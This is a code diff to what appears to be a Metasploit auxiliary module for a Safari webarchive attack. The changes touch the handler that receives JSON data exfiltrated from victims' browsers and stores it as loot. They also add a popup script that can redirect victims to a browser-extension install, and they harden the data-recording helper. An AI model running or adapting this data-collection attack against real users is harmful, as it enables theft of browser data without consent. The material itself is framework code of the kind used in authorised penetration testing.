@@ -63,12 +63,12 @@ class Metasploit3 < Msf::Auxiliary
       begin
         data = JSON::parse(data_str || '')
         file = record_data(data, cli)
-        send_response_html(cli, '')
+        send_response(cli, '')
         print_good "data #{data.keys.join(',')} received and stored to #{file}"
       rescue JSON::ParserError => e # json error, dismiss request & keep crit. server up
         file = record_data(data_str, cli)
         print_error "Invalid JSON stored in #{file}"
-        send_response_html(cli, '')
+        send_response(cli, '')
       end
     elsif req.uri =~ /#{popup_path}$/
       send_response(cli, 200, 'OK', popup_html)
@@ -131,8 +131,7 @@ class Metasploit3 < Msf::Auxiliary
         },
         function() { opener.location = 'about:blank'; },
         function() { opener.history.back(); },
-        function() { },
-        function() { window.location = '#{apple_extension_url}'; }
+        function() { if (#{datastore['INSTALL_EXTENSION']}) { opener.postMessage('EXT', '*'); window.location = '#{apple_extension_url}'; } else { window.close(); } }
       )
 
      </script>
@@ -317,7 +316,8 @@ class Metasploit3 < Msf::Auxiliary
   # @param [Hash] data the data to store in the log
   # @return [String] filename where we are storing the data
   def record_data(data, cli)
-    file = File.basename(data.keys.first).gsub(/[^A-Za-z]/,'')
+    name = if data.is_a?(Hash) then data.keys.first else 'data' end
+    file = File.basename(name).gsub(/[^A-Za-z]/,'')
     store_loot(
       file, "text/plain", cli.peerhost, data, "safari_webarchive", "Webarchive Collected Data"
     )
